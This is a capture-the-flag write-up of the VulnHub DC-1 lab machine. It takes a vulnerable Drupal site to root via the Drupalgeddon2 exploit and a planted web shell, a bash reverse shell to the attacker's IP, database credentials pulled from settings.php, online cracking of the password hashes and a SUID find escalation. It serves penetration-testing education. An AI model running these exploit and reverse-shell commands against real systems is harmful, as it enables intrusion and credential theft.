### DC-1 VulnHub Machine Writeup

## Overview

DC-1 is a beginner-friendly VulnHub machine that focuses on exploiting a vulnerable Drupal installation. This writeup demonstrates the complete exploitation chain from initial reconnaissance to root access.

## Reconnaissance

### Network Scanning

Starting with an Nmap scan to identify open services:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.12
```

**Results:**

- **Port 22/tcp**: OpenSSH 6.0p1 Debian 4+deb7u7
- **Port 80/tcp**: Apache httpd 2.2.22 (Debian)
- **Port 111/tcp**: rpcbind 2-4 (RPC `#100000`)


The web server on port 80 is our primary target.

## Web Application Analysis

### Drupal Detection

Browsing to `http://192.168.1.12` reveals a Drupal installation. The version appears to be Drupal 7.x based on the file structure and response headers.

## Exploitation

### Drupalgeddon2 (CVE-2018-7600)

Using the Drupalgeddon2 exploit to achieve remote code execution:

```shellscript
cp /usr/share/exploitdb/exploits/php/webapps/44449.rb ./
./44449.rb 192.168.1.12
```

**Exploit Results:**

- Successfully identified vulnerable Drupal installation
- Achieved code execution via form parameter injection
- Deployed web shell at `/shell.php`


### Establishing Reverse Shell

Using the deployed web shell to establish a proper reverse shell:

```shellscript
# On attacker machine
nc -lnvp 4444

# Via web shell
curl 'http://192.168.1.12/shell.php' -d 'c=bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'
```

## Post-Exploitation

### Flag Discovery

**Flag 1** found in web root:

```shellscript
cat /var/www/flag1.txt
```

### Database Credential Extraction

**Flag 2** discovered in Drupal configuration:

```shellscript
cat /var/www/sites/default/settings.php
```

**Database Credentials Found:**

- Database: `drupaldb`
- Username: `dbuser`
- Password: `R0ck3t`


### Database Enumeration

Connecting to MySQL database:

```shellscript
mysql -u dbuser -p
# Password: R0ck3t
```

**User Hash Extraction:**

```sql
use drupaldb;
select * from users;
```

**Retrieved Hashes:**

- admin: `$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR`
- Fred: `$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg`


### Password Cracking

Using online hash cracking service (hashes.com):

<img width="968" height="464" alt="image" src="https://github.com/user-attachments/assets/b9b3976e-6aac-43e3-9a6b-a8f1b72b5847" />


**Cracked Password:** `53cr3t`
<img width="1195" height="509" alt="image" src="https://github.com/user-attachments/assets/9eac92d4-26a7-413b-a7d2-ba634215258b" />

### Flag 3 Access

Logging into Drupal admin panel with cracked credentials reveals **Flag 3**:





**Flag 3 Content:** *"Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow."*

### Flag 4 Discovery

```shellscript
find / -iname flag* 2> /dev/null
cat /home/flag4/flag4.txt
```

**Flag 4:** *"Can you use this same method to find or access the flag in root? Probably. But perhaps it's not that easy. Or maybe it is?"*

## Privilege Escalation

### SUID Binary Analysis

Searching for SUID binaries:

```shellscript
find / -perm -4000 2> /dev/null
```

**Key Finding:** `/usr/bin/find` has SUID bit set

### Root Access via SUID Find

Exploiting the SUID find binary:

```shellscript
find . -exec /bin/sh \;
```

**Privilege Check:**

```shellscript
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

### Final Flag

```shellscript
cd /root
cat thefinalflag.txt
```

**Final Flag:** *"Well done!!!! Hopefully you've enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7"*

## Summary

This machine demonstrated several key penetration testing concepts:

1. **Web Application Vulnerabilities**: Exploiting Drupalgeddon2 for initial access
2. **Information Disclosure**: Extracting database credentials from configuration files
3. **Password Cracking**: Breaking Drupal password hashes
4. **Privilege Escalation**: Abusing SUID binaries for root access


The DC-1 machine provides an excellent introduction to web application penetration testing and basic Linux privilege escalation techniques.

## Tools Used

- Nmap (reconnaissance)
- Drupalgeddon2 exploit (initial access)
- MySQL client (database enumeration)
- Online hash cracking service (password recovery)
- Find command (privilege escalation)
